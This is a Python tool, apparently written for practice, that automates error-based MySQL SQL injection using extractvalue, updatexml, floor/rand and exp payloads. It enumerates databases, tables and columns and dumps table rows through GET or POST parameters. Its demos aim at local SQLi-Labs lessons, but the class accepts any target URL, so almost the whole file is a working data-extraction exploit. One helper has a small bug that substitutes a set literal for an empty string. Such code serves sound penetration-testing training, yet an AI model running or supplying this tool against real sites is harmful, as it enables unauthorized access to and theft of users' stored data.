#!/usr/bin/env python3
"""
Double Query Injection Complete Mastery - Ultimate Automation Tool
Includes all injection methods, bypass techniques, data extraction
"""

import requests
from urllib.parse import quote, unquote
import re
import time
import sys

class DoubleQuerySQLi:
    """Double Query Injection Automation Tool"""

    def __init__(self, url, param="id", method="GET", quote_type="'", headers=None, cookies=None, data=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.quote_type = quote_type
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.data = data or {}
        self.session = requests.Session()

        # Available injection methods
        self.methods = {
            'extractvalue': self.inject_extractvalue,
            'updatexml': self.inject_updatexml,
            'floor_rand': self.inject_floor_rand,
            'exp': self.inject_exp,
        }

    def send_request(self, payload):
        """Send injection request"""
        try:
            if self.method == "GET":
                if '?' in self.url:
                    target_url = f"{self.url}&{self.param}={quote(payload)}"
                else:
                    target_url = f"{self.url}?{self.param}={quote(payload)}"
                r = self.session.get(target_url, headers=self.headers, cookies=self.cookies, timeout=10)
            else:  # POST
                post_data = self.data.copy()
                post_data[self.param] = payload
                r = self.session.post(self.url, data=post_data, headers=self.headers, cookies=self.cookies, timeout=10)

            return r.text
        except Exception as e:
            return f"ERROR: {str(e)}"

    def inject_extractvalue(self, query):
        """extractvalue() injection"""
        payload = f"1{self.quote_type} and extractvalue(1,concat(0x7e,({query}),0x7e))--+"
        response = self.send_request(payload)

        if "XPATH syntax error" in response:
            match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', response)
            if match:
                return match.group(1).strip()
        return None

    def inject_updatexml(self, query):
        """updatexml() injection"""
        payload = f"1{self.quote_type} and updatexml(1,concat(0x7e,({query}),0x7e),1)--+"
        response = self.send_request(payload)

        if "XPATH syntax error" in response:
            match = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\n]+)', response)
            if match:
                return match.group(1).strip()
        return None

    def inject_floor_rand(self, query):
        """floor() + rand() + group by injection"""
        payload = f"1{self.quote_type} and (select 1 from(select count(*),concat(({query}),floor(rand(0)*2))x from information_schema.tables group by x)a)--+"
        response = self.send_request(payload)

        if "Duplicate entry" in response:
            match = re.search(r"Duplicate entry '([^']+)'", response)
            if match:
                # Remove trailing 0 or 1
                return match.group(1).rstrip('01')
        return None

    def inject_exp(self, query):
        """exp() overflow injection"""
        payload = f"1{self.quote_type} and exp(~(select * from(({query}))a))--+"
        response = self.send_request(payload)

        if "DOUBLE value is out of range" in response or "exp" in response.lower():
            return "TRIGGERED"  # exp() does not return data, only checks if triggered
        return None

    def test_methods(self):
        """Test all injection methods"""
        print(f"\n{'='*60}")
        print(f"Testing all injection methods")
        print(f"{'='*60}\n")

        working_methods = []

        for method_name, method_func in self.methods.items():
            print(f"Testing {method_name}(): ", end="", flush=True)

            # Test with a simple database query
            result = method_func("SELECT database()")

            if result and result != "TRIGGERED":
                print(f"✅ Success!")
                print(f"   Extracted data: {result}")
                working_methods.append(method_name)
            elif result == "TRIGGERED":
                print(f"✅ Error triggered (no data returned)")
                working_methods.append(method_name)
            else:
                print(f"❌ Failed")

        return working_methods

    def extract_data(self, query, method='extractvalue'):
        """Extract data"""
        if method not in self.methods:
            print(f"❌ Unsupported injection method: {method}")
            return None

        return self.methods[method](query)

    def get_database(self, method='extractvalue'):
        """Get current database name"""
        return self.extract_data("SELECT database()", method)

    def get_version(self, method='extractvalue'):
        """Get database version"""
        return self.extract_data("SELECT version()", method)

    def get_user(self, method='extractvalue'):
        """Get current user"""
        return self.extract_data("SELECT user()", method)

    def get_databases(self, method='extractvalue'):
        """Get all databases"""
        query = "SELECT group_concat(schema_name) FROM information_schema.schemata"
        return self.extract_data(query, method)

    def get_tables(self, database, method='extractvalue'):
        """Get all tables in the specified database"""
        query = f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{database}'"
        return self.extract_data(query, method)

    def get_columns(self, table_name, database=None, method='extractvalue'):
        """Get all columns in the specified table"""
        db_filter = f" AND table_schema='{database}'" if database else {""}
        query = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table_name}'{db_filter}"
        return self.extract_data(query, method)

    def dump_table(self, table_name, columns, limit=10, method='extractvalue'):
        """Extract table data"""
        print(f"\nExtracting {table_name} table data (first {limit} rows):\n")

        results = []
        for i in range(limit):
            if ',' in columns:
                col_list = [f"cast({col} as char)" for col in columns.split(',')]
                select_cols = f"concat({','.join(col_list)},'---')"
            else:
                select_cols = f"concat(cast({columns} as char))"

            query = f"SELECT {select_cols} FROM {table_name} LIMIT {i},1"
            result = self.extract_data(query, method)

            if result and '---' not in result:
                results.append(result)
                print(f"  [{i}] {result}")
            elif result:
                data = result.split('---')[:-1]
                results.append(data)
                print(f"  [{i}] {' | '.join(data)}")
            else:
                break

        return results

    def full_extraction(self, database, table_name, method='extractvalue'):
        """Fully extract data from the specified table"""
        print(f"\n{'='*60}")
        print(f"Full extraction: {database}.{table_name}")
        print(f"{'='*60}\n")

        # 1. Get column names
        print("1. Getting column names...")
        columns = self.get_columns(table_name, database, method)
        if columns:
            print(f"   ✅ Columns: {columns}")
        else:
            print("   ❌ Failed to get column names")
            return None

        # 2. Extract data
        print("\n2. Extracting data...")
        data = self.dump_table(table_name, columns, limit=100, method=method)

        if data:
            print(f"\n✅ Successfully extracted {len(data)} rows")
        else:
            print(f"\n❌ No data extracted")

        return {
            'columns': columns,
            'data': data
        }


def main():
    """Main function - Demo and testing"""

    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║         Double Query Injection Complete Mastery - Ultimate ║
    ║                  Version 1.0 - 7x24 Mode                   ║
    ╚════════════════════════════════════════════════════════════╝
    """)

    # Demo 1: SQLi-Labs Less-5 test
    print("\n" + "="*60)
    print("Demo 1: SQLi-Labs Less-5 (single quote injection)")
    print("="*60)

    sqli = DoubleQuerySQLi(
        url="http://localhost/sqli-labs/Less-5/",
        param="id",
        method="GET",
        quote_type="'"
    )

    # Test all methods
    working_methods = sqli.test_methods()

    if working_methods:
        print(f"\n✅ Available methods: {', '.join(working_methods)}")
        method = working_methods[0]  # Use the first available method

        # Extract data
        print(f"\nExtracting data using {method}():\n")

        db = sqli.get_database(method)
        if db:
            print(f"Database: {db}")

        version = sqli.get_version(method)
        if version:
            print(f"Version: {version}")

        tables = sqli.get_tables('security', method)
        if tables:
            print(f"Tables: {tables}")

        # Extract users table
        if 'users' in str(tables):
            print(f"\nExtracting users table...")
            users = sqli.full_extraction('security', 'users', method)

    # Demo 2: Less-6 (double quote injection)
    print("\n" + "="*60)
    print("Demo 2: SQLi-Labs Less-6 (double quote injection)")
    print("="*60)

    sqli2 = DoubleQuerySQLi(
        url="http://localhost/sqli-labs/Less-6/",
        param="id",
        method="GET",
        quote_type='"'
    )

    methods = sqli2.test_methods()

    # Demo 3: POST injection (Less-13)
    print("\n" + "="*60)
    print("Demo 3: SQLi-Labs Less-13 (POST injection)")
    print("="*60)

    sqli3 = DoubleQuerySQLi(
        url="http://localhost/sqli-labs/Less-13/",
        param="uname",
        method="POST",
        quote_type="')",
        data={"passwd": "test", "submit": "Submit"}
    )

    methods = sqli3.test_methods()

    print("\n" + "="*60)
    print("✅ All demos completed!")
    print("="*60)


if __name__ == "__main__":
    main()
